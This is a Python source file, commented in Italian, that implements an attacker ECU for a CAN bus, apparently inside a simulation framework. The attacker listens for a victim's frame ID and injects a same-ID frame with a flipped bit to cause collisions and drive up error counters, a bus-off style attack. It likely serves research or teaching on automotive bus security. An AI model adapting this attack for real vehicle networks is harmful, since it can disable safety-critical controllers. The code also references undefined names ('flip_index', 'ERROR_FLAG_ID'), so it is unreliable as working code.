from ecu_base import ECU, Role, NodeState, ErrorFlagType
import can
import time
import random
import sys

# --- Funzioni per Bit Flipping (Copiate dall'ultima versione funzionante) ---

def flip_first_one_from_left(byte_val: int) -> int:
    """
    Cerca il primo bit a 1 da sinistra (bit 7 → 0) e lo mette a 0.
    Se il byte è 0x00, lo lascia invariato.
    """
    for bit in range(7, -1, -1):
        if byte_val & (1 << bit):
            return byte_val & ~(1 << bit)
    return byte_val


# --- Classe Attacker ---

class AttackerECU(ECU):
    def __init__(self, victim_id: int, *args, **kwargs):
        # L'Attaccante non trasmette ciclicamente, quindi period_sec=0.0
        super().__init__(*args, **kwargs)
        self.victim_id = victim_id

    # L'Attaccante non trasmette periodicamente, quindi override del loop TX
    def _tx_loop(self):
        while not self._stop:
            time.sleep(0.1)

    def _handle_normal_frame(self, msg: can.Message):
        """
        L'Attaccante sniffa il bus e risponde solo al frame della Vittima.
        """
        if msg.arbitration_id != self.victim_id:
            # Ignora tutti i messaggi che non sono il bersaglio
            return
            
        modified_data = bytearray(msg.data)
        if len(modified_data) > 0:
            modified_data[0] = flip_first_one_from_left(modified_data[0])
        
        att_msg = can.Message(
            arbitration_id=self.victim_id, # Stesso ID per garantire la collisione
            data=modified_data,
            is_extended_id=msg.is_extended_id
        )

        try:
            # 2. Iniezione del frame corrotto (Bit Flip)
            self.currently_transmitting = True
            self.last_tx_data = bytes(modified_data)
            self.last_tx_time = time.time()

            self.bus.send(att_msg)
            print(f"[{self.name}] ATTACK: TX_V={msg.data.hex().upper()} → TX_A={att_msg.data.hex().upper()} (Bit: {flip_index})")

            error_detected = False
            response_msg = self.bus.recv(timeout=0.05)

            if response_msg is not None and response_msg.arbitration_id == ERROR_FLAG_ID:
                flag_type = ErrorFlagType(response_msg.data[0])
                if flag_type == ErrorFlagType.ACTIVE:
                    self._on_tx_error() # TEC++ 
                    error_detected = True
                    print(f"[{self.name}] att --> TEC +8: Rilevato ERROR FLAG ACTIVE della Vittima.")
            
            if not error_detected:
                # Se non ha rilevato l'Active Error Flag, la trasmissione è considerata successo
                # (o perché non c'è stato errore, o perché la Vittima è in Passive e lo ignoriamo).
                self._on_tx_success()
                print(f"[{self.name}] att --> TEC -1: (TX successo).")

        except can.CanError as e:
            print(f"[{self.name}] Errore invio frame attacco: {e}")
            self._on_tx_error() # Aumenta TEC per errore di driver

        finally:
            time.sleep(0.01)
            self.currently_transmitting = False
